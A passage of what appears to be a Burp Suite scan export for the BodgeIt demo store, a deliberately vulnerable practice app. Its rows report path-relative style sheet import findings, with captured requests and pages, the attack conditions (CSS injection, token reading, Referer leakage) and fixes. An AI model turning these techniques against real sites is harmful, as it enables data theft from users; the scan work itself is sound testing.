align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>About Us</h3> Here at the BodgeIt Store we live up to our name and our motto!<br/><br/> OK, so this is really a test application that contains a range of vulnerabilities.<br/><br/> How many can you find and exploit?? <br/><br/> Check your progress on the <a href=""score.jsp"">Scoring page</a>. </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","70","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/admin.jsp","","","http://localhost:8080/bodgeit/admin.jsp","","GET /bodgeit/admin.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2892 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Admin page</h3> <br/><center><table class=""border"" width=""80%""> <tr><th>UserId</th><th>User</th><th>Role</th><th>BasketId</th></tr> <tr> <td>1</td><td>user1@thebodgeitstore.com</td><td>USER</td><td>0</td> </tr> <tr> <td>2</td><td>admin@thebodgeitstore.com</td><td>ADMIN</td><td>0</td> </tr> <tr> <td>3</td><td>test@thebodgeitstore.com</td><td>USER</td><td>1</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>UserId</th><th>Date</th></tr> <tr> <td>1</td><td>3</td><td>2016-03-28 15:07:56.862</td> </tr> <tr> <td>2</td><td>0</td><td>2016-03-28 15:09:55.338</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>ProductId</th><th>Quantity</th></tr> <tr> <td>1</td><td>1</td><td>1</td> </tr> <tr> <td>1</td><td>3</td><td>2</td> </tr> <tr> <td>1</td><td>5</td><td>3</td> </tr> <tr> <td>1</td><td>7</td><td>4</td> </tr> <tr> <td>2</td><td>28</td><td>11</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","73","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/advanced.jsp","","","http://localhost:8080/bodgeit/advanced.jsp","","GET /bodgeit/advanced.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/search.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3254 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <SCRIPT> loadfile('./js/encryption.js'); var key = ""1e9cfcce-d5ec-48""; function validateForm(form){ var query = document.getElementById('query'); var q = document.getElementById('q'); var val = encryptForm(key, form); if(val){ q.value = val; query.submit(); } return false; } function encryptForm(key, form){ var params = form_to_params(form).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/""/g, '&quot;').replace(/'/g, '&#39'); if(params.length > 0) return Aes.Ctr.encrypt(params, key, 128); return false; } </SCRIPT> <h3>Search</h3> <font size=""-1""> <form id=""advanced"" name=""advanced"" method=""POST"" onsubmit=""return validateForm(this);false;""> <table> <tr><td>Product:</td><td><input id='product' type='text' name='product' /></td></td> <tr><td>Description:</td><td><input id='desc' type='text' name='description' /></td></td> <tr><td>Type:</td><td><input id='type' type='text' name='type' /></td></td> <tr><td>Price:</td><td><input id='price' type='text' name='price' /></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> </table> </form> <form id=""query"" name=""advanced"" method=""POST""> <input id='q' type=""hidden"" name=""q"" value="""" /> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","57","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/basket.jsp","","","http://localhost:8080/bodgeit/basket.jsp","","GET /bodgeit/basket.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3227 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr> <td><a href=""product.jsp?prodid=28"">Bonzo dog doo dah</a></td> <td style=""text-align: center"">&nbsp;<a href=""#"" onclick=""decQuantity(28);""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity_28"" name=""quantity_28"" value=""11"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity(28);""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp;</td> <td align=""right"">$2.45</td> </td><td align=""right"">$26.95</td> </tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$26.95</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","64","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/contact.jsp","","","http://localhost:8080/bodgeit/contact.jsp","","GET /bodgeit/contact.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2342 Date: Mon, 28 Mar 2016 20:11:03 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Contact Us</h3> Please send us your feedback: <br/><br/> <form method=""POST""> <input type=""hidden"" id=""user"" name=""null"" value=""""/> <input type=""hidden"" id=""anticsrf"" name=""anticsrf"" value=""0.984290394814531""></input> <center> <table> <tr> <td><textarea id=""comments"" name=""comments"" cols=80 rows=8></textarea></td> </tr> <tr> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
